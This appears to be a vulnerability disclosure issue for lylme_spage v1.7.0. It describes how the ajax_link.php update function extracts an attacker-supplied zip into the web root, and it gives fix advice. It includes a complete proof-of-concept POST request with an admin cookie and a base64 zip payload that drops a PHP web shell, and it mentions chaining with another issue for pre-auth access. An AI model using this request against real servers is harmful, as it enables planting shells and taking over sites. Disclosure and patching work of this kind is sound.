| Upload Shell Vulnerability in ajax\_link.php1.Steps to reproduce 1.Access <http://host/admin/ajax_link.php?submit=update> via POST method and carry the follw data, the injection point is `file` field within HTTP Body.  Although this is a backend vulnerability, the Pre-Auth chain to upload shell can be implemented in conjunction with [#32](https://github.com/LyLme/lylme_spage/issues/32)  ``` POST /lylme_spage-master/admin/ajax_link.php?submit=update HTTP/1.1 Host: host Connection: close Cookie: admin_token=ec2a3HYAaqQws10zQfeSJaDeJN1aI2gOnV9BLpaHNYdb2hHPQ9nYkoMzuOuQIokfoyJRVcVNK3aT8JUZXq5WSPqTBQ; Content-Type: application/x-www-form-urlencoded Content-Length: 198  file=data://text/plain;base64,UEsDBBQAAAAIALMUSFdQg8x9EgAAABIAAAAFAAAAMS5waHCzsS/IKFAA4sy8tHwNTWt7OwBQSwECFAMUAAAACACzFEhXUIPMfRIAAAASAAAABQAAAAAAAAAAAAAAgAEAAAAAMS5waHBQSwUGAAAAAAEAAQAzAAAANQAAAAAA ```  [image-20231009215458660](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20231009215458660.png)  2.After submit the request, the shell 1.php will be extracted to the ROOT dir.  [image-20231009215829759](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20231009215829759.png) 2.Expected behaviour The code snippet as shown meant to update system from zip compress package.  [image-20231009220523659](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20231009220523659.png) 3.Actual behaviour Howerver, audit the code depth, found that the extracted `$RemoteFile` can passed any malicious data, and then release to ROOT Dir via `zipExtract` function directlty.  [image-20231009220254386](https://raw.githubusercontent.com/mstxq17/figuredbed/master/imgimage-20231009220254386.png) 4.Affected Version this Vuln Affect latest Version: lylme\_spagev1.7.0 5.fixes Recommendations For fix this vuln， Here is my advices:  1.Delete this function point  2.Limit decompression file suffixes |
